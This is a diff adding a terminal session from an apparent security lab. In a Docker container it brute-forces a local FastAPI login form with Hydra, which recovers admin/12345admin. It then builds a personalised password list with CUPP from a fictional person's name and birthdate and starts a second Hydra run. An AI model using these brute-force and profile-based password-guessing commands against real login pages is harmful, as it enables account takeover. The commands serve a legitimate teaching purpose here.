@@ -1,0 +1,21 @@
+amal@MacBook-Air-Amal-2 lab12 % docker run -it --name lab12 ubuntu bash
+root@583ddc409ddb:/# apt install -y hydra git python3
+root@583ddc409ddb:/# fastapi dev main.py --host 0.0.0.0 &
+root@583ddc409ddb:/# curl localhost:8000/login
+{"detail":"Method Not Allowed"}
+root@583ddc409ddb:/# echo "admin" > usernames.txt
+root@583ddc409ddb:/# echo "12345admin" > passwords.txt
+root@583ddc409ddb:/# hydra -f -I -V -L usernames.txt -P passwords.txt -s 8000 localhost http-form-post "/login:username=^USER^&password=^PASS^:F=Invalid"
+Hydra v9.5 (c) 2023 by van Hauser/THC
+[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1)
+[8000][http-post-form] host: localhost   login: admin   password: 12345admin
+1 of 1 target successfully completed, 1 valid password found
+root@583ddc409ddb:/# git clone https://github.com/Mebus/cupp.git
+root@583ddc409ddb:/# cd cupp
+root@583ddc409ddb:/cupp# python3 cupp.py -i
+> First Name: John
+> Surname: Doe
+> Nickname: jd
+> Birthdate: 01011990
+[+] Saving dictionary to john.txt, counting 14776 words.
+root@583ddc409ddb:/cupp# hydra -f -I -V -L ../usernames.txt -P john.txt -s 8000 localhost http-form-post "/login:username=^USER^&password=^PASS^:F=Invalid"
